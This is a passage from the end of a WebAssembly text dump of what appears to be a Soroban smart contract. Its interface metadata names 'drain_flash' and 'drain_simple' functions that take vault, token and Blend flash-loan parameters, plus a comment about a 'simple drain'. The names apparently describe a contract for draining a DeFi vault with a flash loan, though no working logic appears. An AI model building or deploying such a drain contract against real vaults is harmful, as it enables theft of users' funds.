capital\00\00\00\00\00\00\0bdrain_flash\00\00\00\00\05\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0ablend_pool\00\00\00\00\00\13\00\00\00\00\00\00\00\0cflash_amount\00\00\00\0b\00\00\00\01\00\00\00\0b\00\00\00\01\00\00\00DBlend flash_loan param struct \e2\80\94 must match Blend's expected format\00\00\00\00\00\00\00\09FlashLoan\00\00\00\00\00\00\03\00\00\00\00\00\00\00\06amount\00\00\00\00\00\0b\00\00\00\00\00\00\00\05asset\00\00\00\00\00\00\13\00\00\00\00\00\00\00\08contract\00\00\00\13\00\00\00\00\00\00\00/Simple drain \e2\80\94 just report + deposit/withdraw\00\00\00\00\0cdrain_simple\00\00\00\04\00\00\00\00\00\00\00\05owner\00\00\00\00\00\00\13\00\00\00\00\00\00\00\05vault\00\00\00\00\00\00\13\00\00\00\00\00\00\00\0atoken_addr\00\00\00\00\00\13\00\00\00\00\00\00\00\0edeposit_amount\00\00\00\00\00\0b\00\00\00\01\00\00\00\0b")
  (@custom "contractenvmetav0" (after data) "\00\00\00\00\00\00\00\16\00\00\00\00")
  (@custom "contractmetav0" (after data) "\00\00\00\00\00\00\00\05rsver\00\00\00\00\00\00\061.94.1\00\00\00\00\00\00\00\00\00\08rssdkver\00\00\00022.0.11#34f7f53ae31e0fd02aab436a9872e79fa671ca02")
)
